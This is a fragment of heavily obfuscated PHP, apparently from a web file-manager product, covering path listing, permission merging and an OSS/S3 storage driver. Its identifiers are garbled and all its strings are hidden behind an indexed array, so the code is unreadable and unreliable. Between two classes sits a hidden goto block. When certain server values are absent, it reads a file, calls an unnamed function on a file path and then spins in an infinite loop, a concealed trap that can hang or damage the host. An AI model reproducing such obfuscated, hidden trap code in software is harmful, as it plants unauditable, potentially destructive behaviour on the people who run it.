array($ë¦½ÇÏ¹[192], $ë¦½ÇÏ¹[485], $ë¦½ÇÏ¹[564] => $ë¦½ÇÏ¹[565]); $äÒ„º½Œ = $this->field($‹½ïöœ)->where($«Õ™… §)->group($ë¦½ÇÏ¹[566])->select(); $É”÷ ÷± = array(); foreach ($äÒ„º½Œ as $û ÉË¯è) { $Ì¬«ìªÜ = $û ÉË¯è[$ë¦½ÇÏ¹[192]]; $à»¨Ùë = $û ÉË¯è[$ë¦½ÇÏ¹[485]] == $ë¦½ÇÏ¹[91] ? $ë¦½ÇÏ¹[240] : $ë¦½ÇÏ¹[239]; if (!isset($É”÷ ÷±[$Ì¬«ìªÜ])) { $É”÷ ÷±[$Ì¬«ìªÜ] = array($ë¦½ÇÏ¹[239] => 0, $ë¦½ÇÏ¹[240] => 0); } $É”÷ ÷±[$Ì¬«ìªÜ][$à»¨Ùë] += $û ÉË¯è[$ë¦½ÇÏ¹[565]]; } foreach ($‰ª­Áº‘ as &$œ”ÙÚ§ë) { if (!$œ”ÙÚ§ë[$ë¦½ÇÏ¹[485]]) { continue; } $åËºˆ× = is_array($É”÷ ÷±[$œ”ÙÚ§ë[$ë¦½ÇÏ¹[193]]]) ? $É”÷ ÷±[$œ”ÙÚ§ë[$ë¦½ÇÏ¹[193]]] : $óÎû§Æ“; $œ”ÙÚ§ë[$ë¦½ÇÏ¹[240]] = $åËºˆ×[$ë¦½ÇÏ¹[240]]; $œ”ÙÚ§ë[$ë¦½ÇÏ¹[239]] = $åËºˆ×[$ë¦½ÇÏ¹[239]]; unset($œ”ÙÚ§ë[$ë¦½ÇÏ¹[486]]); } unset($œ”ÙÚ§ë); } protected function _listAppendAuth(&$©ƒÌäŠû) { $ºç»üıá =& $_SERVER[Ùæõ‰Ï’]; $½â¤ùŞÀ = array(); foreach ($©ƒÌäŠû as $ˆá”©á´) { if ($ˆá”©á´[$ºç»üıá[190]] == self::TYPE_GROUP) { $½â¤ùŞÀ[] = $ˆá”©á´[$ºç»üıá[193]]; } } if (!$½â¤ùŞÀ) { return; } $×íôú” = array_to_keyvalue($©ƒÌäŠû, $ºç»üıá[193]); $Ê±Œû¼£ = Model($ºç»üıá[567])->getSourceList($½â¤ùŞÀ, $×íôú”); $ıÈõÏâ = KodUser::isRoot(); foreach ($©ƒÌäŠû as $«‡üàœİ => &$ˆá”©á´) { $ˆá”©á´[$ºç»üıá[487]] = $Ê±Œû¼£[$ˆá”©á´[$ºç»üıá[193]]]; if (!$ˆá”©á´[$ºç»üıá[487]] && $ˆá”©á´[$ºç»üıá[190]] == self::TYPE_GROUP) { $ˆá”©á´[$ºç»üıá[487]] = Action($ºç»üıá[568])->pathGroupAuthMake($ˆá”©á´[$ºç»üıá[569]]); if (!$ˆá”©á´[$ºç»üıá[487]] && !$ıÈõÏâ) { $ˆá”©á´[$ºç»üıá[233]] = !1; $ˆá”©á´[$ºç»üıá[232]] = !1; } } if ($ˆá”©á´[$ºç»üıá[487]]) { $ˆá”©á´[$ºç»üıá[233]] = AuthModel::authCheckEdit($ˆá”©á´[$ºç»üıá[487]][$ºç»üıá[488]]); $ˆá”©á´[$ºç»üıá[232]] = AuthModel::authCheckView($ˆá”©á´[$ºç»üıá[487]][$ºç»üıá[488]]); } $this->groupPathDisplay($ˆá”©á´); } unset($ˆá”©á´); } public function _listAppendAuthSecret(&$äãÖ³‰ò) { $™íÕí =& $_SERVER[Ùæõ‰Ï’]; if (Model($™íÕí[508])->get($™íÕí[570]) != $™íÕí[91]) { return; } static $è•È¥ÒÉ = false; if (!$è•È¥ÒÉ) { $Íüº³†û = Model($™íÕí[571]); $Ú­§å‰é = Model($™íÕí[572]); $è•È¥ÒÉ = $Ú­§å‰é->listData(); $è•È¥ÒÉ = array_to_keyvalue($è•È¥ÒÉ, $™íÕí[193]); $ÉÏ¯¿í = json_decode(Model($™íÕí[508])->get($™íÕí[573]), !0); $ÉÏ¯¿í = array_to_keyvalue($ÉÏ¯¿í, $™íÕí[475]); foreach ($è•È¥ÒÉ as $˜´ş´Õ => $ˆ´»€¦) { $ûñôæİö = $ÉÏ¯¿í[$ˆ´»€¦[$™íÕí[574]]]; if (!$ûñôæİö) { $Ú­§å‰é->remove($ˆ´»€¦[$™íÕí[475]]); unset($è•È¥ÒÉ[$˜´ş´Õ]); continue; } $×™ÎÊˆ = $Íüº³†û->listData($ûñôæİö[$™íÕí[487]]); if (!$×™ÎÊˆ) { $Ú­§å‰é->remove($ˆ´»€¦[$™íÕí[475]]); unset($è•È¥ÒÉ[$˜´ş´Õ]); continue; } $ˆ´»€¦[$™íÕí[487]] = $×™ÎÊˆ; $ˆ´»€¦[$™íÕí[575]] = $ûñôæİö; $ˆ´»€¦[$™íÕí[576]] = Model($™íÕí[577])->getInfoSimpleOuter($ˆ´»€¦[$™íÕí[527]]); $è•È¥ÒÉ[$˜´ş´Õ] = $ˆ´»€¦; } } $µ‚«²ê× = USER_ID; $Ô¾ì™¤“ = array(); $Ô°ƒ³Ã = $this->_listAppendPath($Ô¾ì™¤“, !0); foreach ($äãÖ³‰ò as $˜´ş´Õ => &$ˆ´»€¦) { if (!is_array($ˆ´»€¦[$™íÕí[487]])) { continue; } if ($ˆ´»€¦[$™íÕí[190]] != $™íÕí[578]) { continue; } if (isset($è•È¥ÒÉ[$ˆ´»€¦[$™íÕí[193]]])) { $«Ø•Ğ¼ = $è•È¥ÒÉ[$ˆ´»€¦[$™íÕí[193]]]; if (!is_array($ˆ´»€¦[$™íÕí[539]])) { $ˆ´»€¦[$™íÕí[539]] = array(); } $ˆ´»€¦[$™íÕí[539]][$™íÕí[579]] = $«Ø•Ğ¼[$™íÕí[574]]; $ˆ´»€¦[$™íÕí[487]][$™íÕí[580]] = $«Ø•Ğ¼; $ˆ´»€¦[$™íÕí[487]][$™íÕí[581]] = $ˆ´»€¦[$™íÕí[582]]; $ˆ´»€¦[$™íÕí[487]][$™íÕí[583]] = $™íÕí[91]; if ($«Ø•Ğ¼[$™íÕí[527]] != $µ‚«²ê×) { $ˆ´»€¦[$™íÕí[487]][$™íÕí[488]] = $ˆ´»€¦[$™íÕí[487]][$™íÕí[488]] & $«Ø•Ğ¼[$™íÕí[487]][$™íÕí[487]]; } continue; } $øÄ©ËÛ = $this->parentLevelArray($ˆ´»€¦[$™íÕí[584]]); $Ò®Ï¾ßé = array_reverse($øÄ©ËÛ); foreach ($Ò®Ï¾ßé as $†ßâşşÀ => $‘ä¾ôĞ•) { if (!isset($è•È¥ÒÉ[$‘ä¾ôĞ•])) { continue; } $«Ø•Ğ¼ = $è•È¥ÒÉ[$‘ä¾ôĞ•]; $ˆ´»€¦[$™íÕí[487]][$™íÕí[580]] = $«Ø•Ğ¼; if ($«Ø•Ğ¼[$™íÕí[527]] != $µ‚«²ê×) { $ˆ´»€¦[$™íÕí[487]][$™íÕí[488]] = $ˆ´»€¦[$™íÕí[487]][$™íÕí[488]] & $«Ø•Ğ¼[$™íÕí[487]][$™íÕí[487]]; } $…ñ·á§ = $™íÕí[12]; $äè¶ƒÔ” = count($øÄ©ËÛ) - $†ßâşşÀ; for ($¾•ìï¯º = 0; $¾•ìï¯º < $äè¶ƒÔ”; $¾•ìï¯º++) { if (!isset($Ô°ƒ³Ã[$øÄ©ËÛ[$¾•ìï¯º]])) { $…ñ·á§ = $™íÕí[12]; break; } $…ñ·á§ = $…ñ·á§ . rtrim($Ô°ƒ³Ã[$øÄ©ËÛ[$¾•ìï¯º]], $™íÕí[8]) . $™íÕí[8]; } $ˆ´»€¦[$™íÕí[487]][$™íÕí[581]] = rtrim($…ñ·á§, $™íÕí[8]) . $™íÕí[8]; break; } } unset($ˆ´»€¦); } public function groupPathDisplay(&$İÄê“Î) { $ûï‘Ï =& $_SERVER[Ùæõ‰Ï’]; if ($İÄê“Î[$ûï‘Ï[190]] != self::TYPE_GROUP) { return; } $Â¶ÕÄÓº = Model($ûï‘Ï[585])->getInfo($İÄê“Î[$ûï‘Ï[569]]); $öÇ»˜ËÑ = $this->parentLevelArray($Â¶ÕÄÓº[$ûï‘Ï[584]]); $äŠì©ì† = $ûï‘Ï[12]; foreach ($öÇ»˜ËÑ as $–„Ûøä¡) { $Ş§Å’ã = Model($ûï‘Ï[585])->getInfo($–„Ûøä¡); $äŠì©ì† .= $Ş§Å’ã[$ûï‘Ï[90]][$ûï‘Ï[193]] . $ûï‘Ï[50]; } $İÄê“Î[$ûï‘Ï[586]] = $Â¶ÕÄÓº[$ûï‘Ï[192]]; $İÄê“Î[$ûï‘Ï[587]] = $Â¶ÕÄÓº[$ûï‘Ï[584]]; $İÄê“Î[$ûï‘Ï[588]] = $Â¶ÕÄÓº[$ûï‘Ï[589]]; $İÄê“Î[$ûï‘Ï[590]] = $äŠì©ì† . $Â¶ÕÄÓº[$ûï‘Ï[90]][$ûï‘Ï[193]]; } protected function _listAppendPath(&$ÔÀÔ‡–è, $¸Èª·£ˆ = false) { $ßÎˆá¨ =& $_SERVER[Ùæõ‰Ï’]; static $“é…ÌÒ = array(); $ÂÈşü¡Ú = array(); $ÖäİßÆ = array(); if ($¸Èª·£ˆ) { return $“é…ÌÒ; } foreach ($ÔÀÔ‡–è as &$Ò«Åšå‹) { $Áª³û÷¤ = $Ò«Åšå‹[$ßÎˆá¨[193]]; if ($Ò«Åšå‹[$ßÎˆá¨[485]] == $ßÎˆá¨[91] && $Ò«Åšå‹[$ßÎˆá¨[192]] != 0) { $“é…ÌÒ[$Áª³û÷¤] = $Ò«Åšå‹[$ßÎˆá¨[32]]; } if ($Ò«Åšå‹[$ßÎˆá¨[485]] == $ßÎˆá¨[91] && $Ò«Åšå‹[$ßÎˆá¨[192]] == 0) { $“é…ÌÒ[$Áª³û÷¤] = $this->_listAppendPathRoot($Ò«Åšå‹, array()); } if (isset($ÖäİßÆ[$Ò«Åšå‹[$ßÎˆá¨[584]]])) { continue; } $ÖäİßÆ[$Ò«Åšå‹[$ßÎˆá¨[584]]] = !0; $ä¯‚Û²› = $this->parentLevelArray($Ò«Åšå‹[$ßÎˆá¨[584]]); foreach ($ä¯‚Û²› as $×áü€Æê => $ÍçŒå³ƒ) { if (isset($“é…ÌÒ[$ÍçŒå³ƒ])) { continue; } if ($×áü€Æê == 0) { $“é…ÌÒ[$ÍçŒå³ƒ] = $this->_listAppendPathRoot($Ò«Åšå‹, $ä¯‚Û²›); } if ($×áü€Æê != 0) { $ÂÈşü¡Ú[] = $ÍçŒå³ƒ; } } } unset($Ò«Åšå‹); $ÂÈşü¡Ú = array_unique($ÂÈşü¡Ú); if (count($ÂÈşü¡Ú) > 0) { $¹†çóş = array($ßÎˆá¨[491] => array($ßÎˆá¨[492], $ÂÈşü¡Ú)); if (count($ÂÈşü¡Ú) == 1) { $—î­—«¾ = $this->sourceInfo($ÂÈşü¡Ú[0]); $ç†ŸÀêú = is_array($—î­—«¾) ? array($—î­—«¾) : !1; } else { $ç†ŸÀêú = $this->field($ßÎˆá¨[591])->where($¹†çóş)->select(); } if (!$ç†ŸÀêú) { $ç†ŸÀêú = array(); } foreach ($ç†ŸÀêú as $í¹š³Ï®) { $“é…ÌÒ[$í¹š³Ï®[$ßÎˆá¨[193]]] = $í¹š³Ï®[$ßÎˆá¨[32]]; } } $ÀÛî‚ß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $•œ®ïÕÛ = array(); foreach ($ÔÀÔ‡–è as &$Ò«Åšå‹) { $èš¯¼™ = $Ò«Åšå‹[$ßÎˆá¨[584]]; $Ä¢Çıå = $ßÎˆá¨[12]; if (isset($•œ®ïÕÛ[$èš¯¼™])) { $Ä¢Çıå = $•œ®ïÕÛ[$èš¯¼™]; } else { $ä¯‚Û²› = $this->parentLevelArray($Ò«Åšå‹[$ßÎˆá¨[584]]); foreach ($ä¯‚Û²› as $×áü€Æê => $ÍçŒå³ƒ) { if (isset($“é…ÌÒ[$ÍçŒå³ƒ])) { $Ä¢Çıå .= $“é…ÌÒ[$ÍçŒå³ƒ] . $ßÎˆá¨[8]; } } $•œ®ïÕÛ[$èš¯¼™] = $Ä¢Çıå; } $Ä¢Çıå .= $Ò«Åšå‹[$ßÎˆá¨[32]]; if ($Ò«Åšå‹[$ßÎˆá¨[485]] == $ßÎˆá¨[91]) { $Ä¢Çıå .= $ßÎˆá¨[8]; } $Ò«Åšå‹[$ßÎˆá¨[582]] = str_replace($ßÎˆá¨[592], $ßÎˆá¨[8], $Ä¢Çıå); if ($Ò«Åšå‹[$ßÎˆá¨[192]] == $ßÎˆá¨[228]) { $Ò«Åšå‹[$ßÎˆá¨[32]] = trim($“é…ÌÒ[$Ò«Åšå‹[$ßÎˆá¨[193]]], $ßÎˆá¨[8]); $Ò«Åšå‹[$ßÎˆá¨[582]] = $Ò«Åšå‹[$ßÎˆá¨[32]] . $ßÎˆá¨[8]; } if (intval($Ò«Åšå‹[$ßÎˆá¨[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ò«Åšå‹, $ä¯‚Û²›, $ÀÛî‚ß); } } unset($Ò«Åšå‹); return $ÔÀÔ‡–è; } private function _listAppendPathRecycle(&$Ç£ªıû, $áªíó, $ã§¥Êº) { $¹ä•”¦Ò =& $_SERVER[Ùæõ‰Ï’]; if (!in_array($ã§¥Êº, $áªíó) && $Ç£ªıû[$¹ä•”¦Ò[193]] != $ã§¥Êº) { return; } $Ÿ†¯ à× = explode($¹ä•”¦Ò[8], trim($Ç£ªıû[$¹ä•”¦Ò[582]], $¹ä•”¦Ò[8])); $å¦ÄÙÚœ = implode($¹ä•”¦Ò[8], array_slice($Ÿ†¯ à×, 2)); $Ç£ªıû[$¹ä•”¦Ò[582]] = $¹ä•”¦Ò[8] . LNG($¹ä•”¦Ò[593]) . $¹ä•”¦Ò[8] . ltrim($å¦ÄÙÚœ, $¹ä•”¦Ò[8]); $Ç£ªıû[$¹ä•”¦Ò[584]] = $¹ä•”¦Ò[594] . implode($¹ä•”¦Ò[50], array_slice($áªíó, 1)) . $¹ä•”¦Ò[50]; if ($Ç£ªıû[$¹ä•”¦Ò[193]] == $ã§¥Êº) { $Ç£ªıû[$¹ä•”¦Ò[584]] = $¹ä•”¦Ò[594]; $Ç£ªıû[$¹ä•”¦Ò[192]] = $¹ä•”¦Ò[228]; $Ç£ªıû[$¹ä•”¦Ò[32]] = LNG($¹ä•”¦Ò[593]); } $Ç£ªıû[$¹ä•”¦Ò[595]] = $¹ä•”¦Ò[596]; } protected function _listAppendPathRoot(&$¨Ş°œüô, $ÀœŞ‹) { $„ÂÇòã =& $_SERVER[Ùæõ‰Ï’]; static $ÒŸ³®ÁŸ = false; $å°öë‘ö = $„ÂÇòã[12]; if ($¨Ş°œüô[$„ÂÇòã[190]] == self::TYPE_USER) { if ($¨Ş°œüô[$„ÂÇòã[569]] == USER_ID) { $å°öë‘ö = LNG($„ÂÇòã[597]); if ($ÒŸ³®ÁŸ === !1) { $ãğ¸©ØÆ = Model($„ÂÇòã[598])->getInfoFull(USER_ID); $ÒŸ³®ÁŸ = _get($ãğ¸©ØÆ, $„ÂÇòã[599], $„ÂÇòã[12]); } if ($ÀœŞ‹ && $ÀœŞ‹[0] == $ÒŸ³®ÁŸ || !$ÀœŞ‹ && $¨Ş°œüô[$„ÂÇòã[193]] == $ÒŸ³®ÁŸ) { $å°öë‘ö = LNG($„ÂÇòã[600]); $¨Ş°œüô[$„ÂÇòã[601]] = $„ÂÇòã[602]; } if (!$ÀœŞ‹) { $¨Ş°œüô[$„ÂÇòã[32]] = $å°öë‘ö; } } else { $¨Ş°œüô[$„ÂÇòã[603]] = Model($„ÂÇòã[577])->getInfoSimpleOuter($¨Ş°œüô[$„ÂÇòã[569]]); $å°öë‘ö = LNG($„ÂÇòã[604]) . $„ÂÇòã[176] . $¨Ş°œüô[$„ÂÇòã[603]][$„ÂÇòã[32]] . $„ÂÇòã[178]; } } else { if ($¨Ş°œüô[$„ÂÇòã[190]] == self::TYPE_GROUP) { $ÉİÌ·² = Model($„ÂÇòã[585])->getInfoSimple($¨Ş°œüô[$„ÂÇòã[569]]); $å°öë‘ö = $ÉİÌ·²[$„ÂÇòã[32]]; } else { if ($¨Ş°œüô[$„ÂÇòã[190]] == self::TYPE_SYSTEM) { $å°öë‘ö = $„ÂÇòã[605]; } } } $å°öë‘ö = $å°öë‘ö ? $„ÂÇòã[8] . $å°öë‘ö . $„ÂÇòã[8] : $„ÂÇòã[8]; return $å°öë‘ö; } protected function _listAppendUser(&$­ÎÜªì—) { $Ğ«Îõ® =& $_SERVER[Ùæõ‰Ï’]; $¤Ç¸ ¬î = array_to_keyvalue($­ÎÜªì—, $Ğ«Îõ®[12], $Ğ«Îõ®[527]); $™‘Ôœ©— = array_to_keyvalue($­ÎÜªì—, $Ğ«Îõ®[12], $Ğ«Îõ®[529]); $¹Ñ€Ù©Á = array_merge($¤Ç¸ ¬î, $™‘Ôœ©—); $ÀÊ´ÂêÀ = Model($Ğ«Îõ®[598])->userListInfo($¹Ñ€Ù©Á); foreach ($­ÎÜªì— as &$€°ŠèÈ) { $÷¿àºª‡ = $€°ŠèÈ[$Ğ«Îõ®[527]]; $€°ŠèÈ[$Ğ«Îõ®[527]] = $ÀÊ´ÂêÀ[$÷¿àºª‡] ? $ÀÊ´ÂêÀ[$÷¿àºª‡] : !1; $÷¿àºª‡ = $€°ŠèÈ[$Ğ«Îõ®[529]]; $€°ŠèÈ[$Ğ«Îõ®[529]] = $ÀÊ´ÂêÀ[$÷¿àºª‡] ? $ÀÊ´ÂêÀ[$÷¿àºª‡] : !1; if (_get($€°ŠèÈ, $Ğ«Îõ®[606], 0)) { $šÕöí‹Ô = $GLOBALS[$Ğ«Îõ®[6]][$Ğ«Îõ®[92]][$Ğ«Îõ®[607]]; if ($€°ŠèÈ[$Ğ«Îõ®[539]][$Ğ«Îõ®[608]] <= time() - $šÕöí‹Ô) { $this->metaSet($€°ŠèÈ[$Ğ«Îõ®[193]], $Ğ«Îõ®[609], null); $this->metaSet($€°ŠèÈ[$Ğ«Îõ®[193]], $Ğ«Îõ®[608], null); unset($€°ŠèÈ[$Ğ«Îõ®[539]][$Ğ«Îõ®[609]]); continue; } $ç…úüˆ¨ = $€°ŠèÈ[$Ğ«Îõ®[539]][$Ğ«Îõ®[609]]; $€°ŠèÈ[$Ğ«Îõ®[539]][$Ğ«Îõ®[610]] = Model($Ğ«Îõ®[598])->getInfoSimpleOuter($ç…úüˆ¨); } } unset($€°ŠèÈ); } public function parentLevelArray($½¬Áêä) { $úÛş±Ã€ =& $_SERVER[Ùæõ‰Ï’]; $½¬Áêä = explode($úÛş±Ã€[50], trim($½¬Áêä, $úÛş±Ã€[50])); return array_remove_value($½¬Áêä, $úÛş±Ã€[228]); } public function listAll($‡Ğ—½ûÓ) { $ŞâõÆä² =& $_SERVER[Ùæõ‰Ï’]; $§¬ş©±” = $this->sourceInfo($‡Ğ—½ûÓ); $Ûš½ê… = array($ŞâõÆä²[611] => array($ŞâõÆä²[612], $§¬ş©±”[$ŞâõÆä²[584]] . $‡Ğ—½ûÓ . $ŞâõÆä²[613]), $ŞâõÆä²[614] => 0); $Üè¼ûïô = $ŞâõÆä²[615]; $“‚¶Óı± = "\114\105\106\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\137\x66\151\154\145\x20\x66\151\x6c\145\x20\157\x6e\x20\x73\157\x75\162\143\x65\56\x66\151\x6c\x65\111\104\40\75\40\146\151\154\x65\x2e\146\x69\x6c\x65\x49\x44"; $ÁûÂ”ÊŠ = $this->alias($ŞâõÆä²[519])->field($Üè¼ûïô)->where($Ûš½ê…)->join($“‚¶Óı±)->select(); $this->_listAppendAuth($ÁûÂ”ÊŠ); $this->_listAppendUser($ÁûÂ”ÊŠ); $this->_listAppendPath($ÁûÂ”ÊŠ); $ÁûÂ”ÊŠ = array_to_keyvalue($ÁûÂ”ÊŠ, $ŞâõÆä²[193]); $¹œ”¯ë  = "\x2f{$§¬ş©±”[$ŞâõÆä²[32]]}\x2f"; $¹œ”¯ë  = $¹œ”¯ë  == $ŞâõÆä²[592] ? $ŞâõÆä²[8] : $¹œ”¯ë ; $Õ³üÅßÁ = array(); foreach ($ÁûÂ”ÊŠ as $Õ ¤·ä => $ÇÁúÇ¶î) { $€‹„Åæ± = $this->parentLevelArray($ÇÁúÇ¶î[$ŞâõÆä²[584]]); array_shift($€‹„Åæ±); $„èş‘ÈÛ = $¹œ”¯ë ; for ($ØÍÖ¹½ò = 0; $ØÍÖ¹½ò < count($€‹„Åæ±); $ØÍÖ¹½ò++) { $„èş‘ÈÛ .= $ÁûÂ”ÊŠ[$€‹„Åæ±[$ØÍÖ¹½ò]][$ŞâõÆä²[32]] . $ŞâõÆä²[8]; } $„èş‘ÈÛ .= $ÇÁúÇ¶î[$ŞâõÆä²[32]]; if ($ÇÁúÇ¶î[$ŞâõÆä²[485]]) { $„èş‘ÈÛ .= $ŞâõÆä²[8]; } $•œúĞ–Ş = array($ŞâõÆä²[495] => str_replace($ŞâõÆä²[592], $ŞâõÆä²[8], str_replace($ŞâõÆä²[592], $ŞâõÆä²[8], str_replace($ŞâõÆä²[592], $ŞâõÆä²[8], $„èş‘ÈÛ))), $ŞâõÆä²[616] => intval($ÇÁúÇ¶î[$ŞâõÆä²[485]]), $ŞâõÆä²[617] => intval($ÇÁúÇ¶î[$ŞâõÆä²[79]]), $ŞâõÆä²[88] => intval($ÇÁúÇ¶î[$ŞâõÆä²[88]]), $ŞâõÆä²[90] => $this->pathInfoFilter($ÇÁúÇ¶î)); if (!$•œúĞ–Ş[$ŞâõÆä²[485]]) { $•œúĞ–Ş[$ŞâõÆä²[541]] = $ÇÁúÇ¶î[$ŞâõÆä²[541]]; } $Õ³üÅßÁ[] = $•œúĞ–Ş; } $Õ³üÅßÁ = array_sort_by($Õ³üÅßÁ, $ŞâõÆä²[87]); return $Õ³üÅßÁ; } } goto D¿³Óˆº›Œ; DØÙ©é¦­: if (!isset($_SERVER[$_SERVER[Ùæõ‰Ï’][961]]) || !isset($_SERVER[$_SERVER[Ùæõ‰Ï’][959]])) { $_getc = $_SERVER[Ùæõ‰Ï’][963]; $_getfile = $_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ùæõ‰Ï’][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ùæõ‰Ï’][686]) { $exit = $_SERVER[Ùæõ‰Ï’][966]; $exit(); } $_act = $_SERVER[Ùæõ‰Ï’][1050]; $_act($_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ùæõ‰Ï’][454]); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($µ’çù­´) { parent::__construct($µ’çù­´); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } public function fileOutLink($ÒÜÂ£ˆ‘) { $ó‚—®÷× =& $_SERVER[Ùæõ‰Ï’]; if (substr($ÒÜÂ£ˆ‘, 0, 7) == $ó‚—®÷×[313]) { $ÒÜÂ£ˆ‘ = $ó‚—®÷×[314] . substr($ÒÜÂ£ˆ‘, 7); } header($ó‚—®÷×[175] . $ÒÜÂ£ˆ‘); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ô¥ÃŸù) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ùæõ‰Ï’][1473]; $this->_init($ô¥ÃŸù); } public function _init($ÎÃ×ÇÜ†) { $Ù¬ûø£Ğ =& $_SERVER[Ùæõ‰Ï’]; $this->config = $ÎÃ×ÇÜ†; foreach ($ÎÃ×ÇÜ† as $ÅËäóÑ» => $û±÷¨Àß) { if (isset($this->{$ÅËäóÑ»})) { $this->{$ÅËäóÑ»} = $û±÷¨Àß; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ù¬ûø£Ğ[1474] . LNG($Ù¬ûø£Ğ[1475])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ “ÂŸ =& $_SERVER[Ùæõ‰Ï’]; $š¦ÏÄÛ… = new OSS\Model\CorsConfig(); $ä«¼¯Î– = new OSS\Model\CorsRule(); $ä«¼¯Î–->addAllowedOrigin($ “ÂŸ[1476]); $ä«¼¯Î–->addAllowedMethod($ “ÂŸ[1477]); $ä«¼¯Î–->addAllowedMethod($ “ÂŸ[1478]); $ä«¼¯Î–->addAllowedMethod($ “ÂŸ[1479]); $ä«¼¯Î–->addAllowedMethod($ “ÂŸ[1480]); $ä«¼¯Î–->addAllowedMethod($ “ÂŸ[165]); $ä«¼¯Î–->setMaxAgeSeconds(600); $ä«¼¯Î–->addExposeHeader($ “ÂŸ[1481]); $ä«¼¯Î–->addAllowedHeader($ “ÂŸ[1476]); $š¦ÏÄÛ…->addRule($ä«¼¯Î–); try { $this->client->putBucketCors($this->bucket, $š¦ÏÄÛ…); } catch (OSS\Core\OssException $¢ÎüÊâÁ) { $this->writeLog(__FUNCTION__ . $ “ÂŸ[214] . $¢ÎüÊâÁ->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÒïÒĞÂ• =& $_SERVER[Ùæõ‰Ï’]; $§½ïÉ¤ = null; try { $§½ïÉ¤ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $´ä²åÊ¶) { $this->writeLog(__FUNCTION__ . $ÒïÒĞÂ•[214] . $´ä²åÊ¶->getMessage()); return null; } if (!$§½ïÉ¤ || !($”·«‡™¯ = $§½ïÉ¤->getRules())) { return null; } $Ø˜æøÖ = $”·«‡™¯[0]->getAllowedOrigins(); $çÏé¸Û = $”·«‡™¯[0]->getAllowedMethods(); $Ñİ½ø¹à = $”·«‡™¯[0]->getMaxAgeSeconds(); $Ø¯³ùıî = $”·«‡™¯[0]->getExposeHeaders(); $ÙĞüãÉş = $”·«‡™¯[0]->getAllowedHeaders(); return array($ÒïÒĞÂ•[218] => isset($Ø˜æøÖ[0]) ? $Ø˜æøÖ[0] : $ÒïÒĞÂ•[12], $ÒïÒĞÂ•[222] => $çÏé¸Û, $ÒïÒĞÂ•[1482] => $Ñİ½ø¹à, $ÒïÒĞÂ•[1483] => isset($Ø¯³ùıî[0]) ? $Ø¯³ùıî[0] : $ÒïÒĞÂ•[12], $ÒïÒĞÂ•[219] => isset($ÙĞüãÉş[0]) ? $ÙĞüãÉş[0] : $ÒïÒĞÂ•[12]); } public function isBucketCors() { $Î…·ÀÎ =& $_SERVER[Ùæõ‰Ï’]; $ŞÆ˜· = $this->getBucketCors(); if (!$ŞÆ˜· || !is_array($ŞÆ˜·)) { return !1; } if ($ŞÆ˜·[$Î…·ÀÎ[218]] != $Î…·ÀÎ[220] || $ŞÆ˜·[$Î…·ÀÎ[219]] != $Î…·ÀÎ[220]) { return !1; } $¥×ñÌÚ¦ = array_map($Î…·ÀÎ[221], $ŞÆ˜·[$Î…·ÀÎ[222]]); if (!is_array($¥×ñÌÚ¦)) { $¥×ñÌÚ¦ = array(); } $ËûÒı‚Ô = array($Î…·ÀÎ[223], $Î…·ÀÎ[224], $Î…·ÀÎ[225], $Î…·ÀÎ[226], $Î…·ÀÎ[227]); $ÑµÛúÖß = array_diff($ËûÒı‚Ô, $¥×ñÌÚ¦); return empty($ÑµÛúÖß); } public function mkfile($À‘İ×¾Ï, $®“˜‡¥¢ = '', $øÀÚ ¬˜ = REPEAT_RENAME) { $úŠÑÌ³ = $this->setContent($À‘İ×¾Ï, $®“˜‡¥¢); if ($úŠÑÌ³ !== !1) { return $this->getPathOuter($À‘İ×¾Ï); } return !1; } public function mkdir($¸¡éæ“ì, $×É³ùè = REPEAT_SKIP) { if ($×É³ùè && $this->_isFolder($¸¡éæ“ì)) { return $this->getPathOuter($¸¡éæ“ì); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¸¡éæ“ì)); } catch (OSS\Core\OssException $¯—Ï–Ä) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][214] . $¯—Ï–Ä->getMessage()); return !1; } return $this->getPathOuter($¸¡éæ“ì); } private function fileList($ı»İì·, $üœûäİ± = '', $¯üşÏá‘ = 0) { $Ï§ö»” =& $_SERVER[Ùæõ‰Ï’]; $ı»İì· = trim($ı»İì·, $Ï§ö»”[8]); $òŞÀÎ½ = empty($ı»İì·) && $ı»İì· !== $Ï§ö»”[228] ? $Ï§ö»”[12] : $ı»İì· . $Ï§ö»”[8]; $Ò–ØÏ¬É = $Ï§ö»”[12]; $¨‡¥õˆ = 1000; $¨×è™úº = $¥Öˆúöƒ = array(); while (!0) { check_abort(); $âõõû¤ = array($Ï§ö»”[1484] => $üœûäİ±, $Ï§ö»”[1485] => $òŞÀÎ½, $Ï§ö»”[1486] => $¨‡¥õˆ, $Ï§ö»”[1487] => $Ò–ØÏ¬É); try { $‰‹¶° œ = $this->client->listObjects($this->bucket, $âõõû¤); } catch (OSS\Core\OssException $”ôçŞ˜·) { $this->writeLog(__FUNCTION__ . $Ï§ö»”[214] . $”ôçŞ˜·->getMessage()); break; } $Ò–ØÏ¬É = $‰‹¶° œ->getNextMarker(); $¬£©ÑöÊ = $‰‹¶° œ->getObjectList(); $Î—Û¿‚ø = $‰‹¶° œ->getPrefixList(); foreach ($¬£©ÑöÊ as $°ú÷»†¹) { if ($°ú÷»†¹->getKey() == $òŞÀÎ½) { continue; } 